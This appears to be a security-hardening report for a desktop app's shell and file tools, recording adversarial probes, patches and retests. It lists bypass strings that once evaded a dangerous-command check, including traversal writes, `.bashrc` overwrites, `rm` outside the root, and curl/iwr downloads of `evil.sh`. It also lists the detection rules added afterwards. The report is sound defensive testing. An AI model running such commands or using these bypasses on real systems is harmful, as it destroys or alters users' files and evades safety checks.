# Phase 11 — Post-Hardening Security Report (`POST_HARDENING_SECURITY_REPORT.md`)

## Post-Hardening Adversarial Probes & Patches
1. **Shell Quoting, Redirection & Download-to-File Bypasses (`src/main/shell.js`):**
   - **Found Before Patch:** `echo hi>../evil.txt`, `rm -f "./../../outside.txt"`, `Set-Content -Path $HOME/.bashrc -Value x`, `curl -s https://example.com -o ../../evil.sh`, and `iwr https://example.com -OutFile ..\evil.ps1` all evaluated to `dangerous: false`.
   - **Patch:** Expanded `WRITE_VERB` to include `curl`/`wget` `-o`/`-O`/`--output` and PowerShell `iwr`/`irm`/`Invoke-WebRequest`/`Invoke-RestMethod` `-OutFile`, and updated `writesOutsideRoot()` to catch `>` without spaces, `./../`, `$HOME/`, and `%USERPROFILE%\`.
   - **Retest:** All 5 bypass variants now return `dangerous: true` in `C14 Dangerous Shell` (`tests/security-attack-suite.test.js`).
2. **Dangling & Nested Symlink Regression (`src/main/tools.js`):**
   - **Verified:** Nested junction (`src/linked/id_rsa`, `src/linked/nested/pwn.txt`) and dangling file symlink (`dangling.txt` -> `../outside/nonexistent-target.txt`) both throw `/through a link/`.
   - **Scope Note:** Executed on Windows (`win32`) with NTFS junctions/symlinks; POSIX `chmod`/`symlink` behavior in headless Linux containers was not separately executed here.
3. **`fs:openPath` & `will-navigate` Hardening (`src/main/main.js`):**
   - `fs:openPath` strips trailing dots/spaces (`target.replace(/[. ]+$/, '')`) and includes `.lnk`, `.url`, `.reg`, `.scf` in `EXEC_EXT` (revealing in Explorer instead of executing).
   - `will-navigate` restricts `file:` navigation strictly to the app's own `renderer/index.html`.
